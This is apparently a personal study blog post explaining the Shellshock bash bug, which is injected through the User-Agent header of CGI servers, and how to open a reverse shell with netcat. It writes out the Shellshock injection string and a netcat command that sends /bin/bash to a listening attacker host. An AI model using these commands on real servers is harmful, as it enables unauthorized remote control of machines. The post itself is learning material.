___
layout: post
title: Shellshock and Reverse Shell Using 'Netcat'
___

## Shellshock
`() { :;}; [arbitrary command]` can be used to execute arbitrary commands.\
The shellshock bug can be executed if the environment variable of the cgi is somehow set.\
**Honestly I don't enough about cgi, environment variables, bash to understand exactly how this works.**\
So web servers like apache will make a cgi script. The cgi script wil be executed on a bash shell.\
Apache will send information to the cgi script via environment variables. That will be the key to inject the shellshock code.\

In the web, `User-Agent` header is used for logging purposes, and this is exposed directly to the environment variable.\
By setting the `User-Agent` as the above mentioned shellshock bug, you can get access to the server.

[The original shellshock report](https://seclists.org/oss-sec/2014/q3/650)

## Reverse Shell with Netcat
On the local machine you have access to,
```nc -l -p [port number]```
-l: set to listen mode
-p: will set port number; for the listener, this is the listened port, for the target system, this is the source port

On the penetrated machine,
```nc [ip address] [port number] -e /bin/bash(or other shells such as /bin/sh)```
-e: tell what operation to do after connection is set
